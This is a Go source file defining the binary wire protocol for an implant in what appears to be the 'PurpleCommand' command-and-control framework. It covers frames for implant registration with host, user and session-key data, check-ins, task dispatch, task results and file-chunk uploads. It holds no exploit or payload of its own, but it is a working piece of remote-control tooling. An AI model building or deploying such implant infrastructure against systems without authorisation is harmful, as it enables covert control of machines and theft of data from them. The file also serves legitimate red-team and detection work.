// Package protocol defines the transport-independent PurpleCommand wire
// frames. Listener and speaker transports move these exact bytes in opposite
// HTTP directions; neither transport is allowed to redefine their layout.
package protocol

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"

	implantwire "purpcmd/implant"
	"purpcmd/internal"
)

const (
	MetadataSize          = 31
	MaxPayloadSize        = 8 << 20
	MaxFileNameSize       = 4 << 10
	DefaultMaxTaskPayload = MaxPayloadSize

	// MaxAuthenticatedPacketSize covers the largest CHU frame, AES padding,
	// and the truncated HMAC. MaxEncodedPacketSize is its canonical base64
	// envelope. All HTTP directions use these shared limits so a valid frame
	// accepted through a listener is also valid through a speaker.
	MaxAuthenticatedPacketSize = MaxPayloadSize + MaxFileNameSize + 128 + 32
	MaxEncodedPacketSize       = ((MaxAuthenticatedPacketSize + 2) / 3) * 4
)

var ErrMalformedFrame = errors.New("malformed protocol frame")

type Task struct {
	ID      [8]byte
	Code    uint16
	Payload []byte
}

func WriteMetadata(buffer *bytes.Buffer, metadata *implantwire.ImplantMetadata) {
	_ = binary.Write(buffer, binary.BigEndian, metadata.PID)
	_ = binary.Write(buffer, binary.BigEndian, metadata.SessionID)
	_ = binary.Write(buffer, binary.BigEndian, metadata.OTS)
	_ = binary.Write(buffer, binary.BigEndian, metadata.IP)
	_ = binary.Write(buffer, binary.BigEndian, metadata.Port)
	_ = binary.Write(buffer, binary.BigEndian, metadata.Sleep)
	_ = buffer.WriteByte(metadata.Arch)
}

func ReadMetadata(reader io.Reader, metadata *implantwire.ImplantMetadata) error {
	fields := []struct {
		name  string
		value any
	}{
		{"PID", &metadata.PID},
		{"session ID", &metadata.SessionID},
		{"OTS", &metadata.OTS},
		{"IP", &metadata.IP},
		{"port", &metadata.Port},
		{"sleep", &metadata.Sleep},
		{"architecture", &metadata.Arch},
	}
	for _, field := range fields {
		if err := binary.Read(reader, binary.BigEndian, field.value); err != nil {
			return fmt.Errorf("%w: read %s: %v", ErrMalformedFrame, field.name, err)
		}
	}
	return nil
}

func EncodeRegistration(metadata *implantwire.ImplantMetadata, key, iv [16]byte) []byte {
	buffer := new(bytes.Buffer)
	_ = binary.Write(buffer, binary.BigEndian, uint16(internal.REG))
	WriteMetadata(buffer, metadata)
	_ = binary.Write(buffer, binary.BigEndian, key)
	_ = binary.Write(buffer, binary.BigEndian, iv)
	data := bytes.Join([][]byte{
		[]byte(metadata.Proc), []byte(metadata.Hostname), []byte(metadata.User), []byte(metadata.Type),
	}, internal.SEP)
	_ = binary.Write(buffer, binary.BigEndian, uint16(len(data)))
	_, _ = buffer.Write(data)
	return buffer.Bytes()
}

func EncodeCheck(metadata *implantwire.ImplantMetadata) []byte {
	buffer := new(bytes.Buffer)
	_ = binary.Write(buffer, binary.BigEndian, uint16(internal.CHK))
	WriteMetadata(buffer, metadata)
	return buffer.Bytes()
}

func EncodeResponse(metadata *implantwire.ImplantMetadata, payload []byte, taskID [8]byte) []byte {
	buffer := new(bytes.Buffer)
	_ = binary.Write(buffer, binary.BigEndian, uint16(internal.RSP))
	WriteMetadata(buffer, metadata)
	_ = binary.Write(buffer, binary.BigEndian, taskID)
	_ = binary.Write(buffer, binary.BigEndian, uint32(len(payload)))
	_, _ = buffer.Write(payload)
	return buffer.Bytes()
}

func EncodeChunk(metadata *implantwire.ImplantMetadata, name string, content []byte, taskID [8]byte) []byte {
	buffer := new(bytes.Buffer)
	_ = binary.Write(buffer, binary.BigEndian, uint16(internal.CHU))
	WriteMetadata(buffer, metadata)
	_ = binary.Write(buffer, binary.BigEndian, taskID)
	_ = binary.Write(buffer, binary.BigEndian, uint32(len(name)))
	_, _ = buffer.WriteString(name)
	_ = binary.Write(buffer, binary.BigEndian, uint32(len(content)))
	_, _ = buffer.Write(content)
	return buffer.Bytes()
}

func EncodeTask(code uint16, taskID [8]byte, payload []byte) []byte {
	buffer := new(bytes.Buffer)
	_ = binary.Write(buffer, binary.BigEndian, code)
	_ = binary.Write(buffer, binary.BigEndian, taskID)
	_ = binary.Write(buffer, binary.BigEndian, uint32(len(payload)))
	_, _ = buffer.Write(payload)
	return buffer.Bytes()
}

func DecodeTask(reader io.Reader, maximum uint32) (Task, error) {
	var result Task
	if err := binary.Read(reader, binary.BigEndian, &result.Code); err != nil {
		return Task{}, fmt.Errorf("%w: read task code: %v", ErrMalformedFrame, err)
	}
	if err := binary.Read(reader, binary.BigEndian, &result.ID); err != nil {
		return Task{}, fmt.Errorf("%w: read task ID: %v", ErrMalformedFrame, err)
	}
	var length uint32
	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
		return Task{}, fmt.Errorf("%w: read task payload length: %v", ErrMalformedFrame, err)
	}
	if maximum == 0 {
		maximum = DefaultMaxTaskPayload
	}
	if length > maximum {
		return Task{}, fmt.Errorf("%w: task payload length %d exceeds maximum %d", ErrMalformedFrame, length, maximum)
	}
	result.Payload = make([]byte, int(length))
	if _, err := io.ReadFull(reader, result.Payload); err != nil {
		return Task{}, fmt.Errorf("%w: read task payload: %v", ErrMalformedFrame, err)
	}
	if trailing, ok := reader.(interface{ Len() int }); ok && trailing.Len() != 0 {
		return Task{}, fmt.Errorf("%w: task contains %d trailing bytes", ErrMalformedFrame, trailing.Len())
	}
	return result, nil
}
